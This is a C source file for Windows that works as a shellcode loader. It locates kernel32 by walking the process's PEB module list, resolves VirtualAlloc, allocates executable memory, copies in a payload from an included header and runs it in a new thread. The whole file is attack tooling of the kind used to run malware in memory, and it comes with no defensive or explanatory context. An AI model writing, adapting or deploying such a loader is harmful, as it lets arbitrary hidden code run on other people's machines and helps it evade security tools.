#include <windows.h>
#include "../common/payload.h"

typedef struct _UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWSTR Buffer; } UNICODE_STRING;
typedef struct _PEB_LDR_DATA { ULONG Length; BOOLEAN Initialized; PVOID SsHandle; LIST_ENTRY InLoadOrderModuleList; LIST_ENTRY InMemoryOrderModuleList; LIST_ENTRY InInitializationOrderModuleList; } PEB_LDR_DATA, *PPEB_LDR_DATA;
typedef struct _LDR_DATA_TABLE_ENTRY { LIST_ENTRY InLoadOrderLinks; LIST_ENTRY InMemoryOrderLinks; LIST_ENTRY InInitializationOrderLinks; PVOID DllBase; PVOID EntryPoint; ULONG SizeOfImage; UNICODE_STRING FullDllName; UNICODE_STRING BaseDllName; } LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;
typedef struct _PEB { BOOLEAN InheritedAddressSpace; BOOLEAN ReadImageFileExecOptions; BOOLEAN BeingDebugged; BOOLEAN BitField; HANDLE Mutant; PVOID ImageBaseAddress; PPEB_LDR_DATA Ldr; } PEB, *PPEB;

int main() {
    PEB* peb;
#if defined(_WIN64)
    peb = (PEB*)__readgsqword(0x60);
#else
    peb = (PEB*)__readfsdword(0x30);
#endif
    PLDR_DATA_TABLE_ENTRY module = (PLDR_DATA_TABLE_ENTRY)((BYTE*)peb->Ldr->InMemoryOrderModuleList.Flink - 16); // kernel32 usually 3rd
    module = (PLDR_DATA_TABLE_ENTRY)((BYTE*)module->InMemoryOrderLinks.Flink - 16);
    module = (PLDR_DATA_TABLE_ENTRY)((BYTE*)module->InMemoryOrderLinks.Flink - 16);
    HMODULE k32 = (HMODULE)module->DllBase;
    
    FARPROC pVirtualAlloc = GetProcAddress(k32, "VirtualAlloc");
    void *exec = ((void*(*)(void*, SIZE_T, DWORD, DWORD))pVirtualAlloc)(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(exec, payload, payload_len);
    HANDLE th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec, 0, 0, 0);
    WaitForSingleObject(th, INFINITE);
    return 0;
}
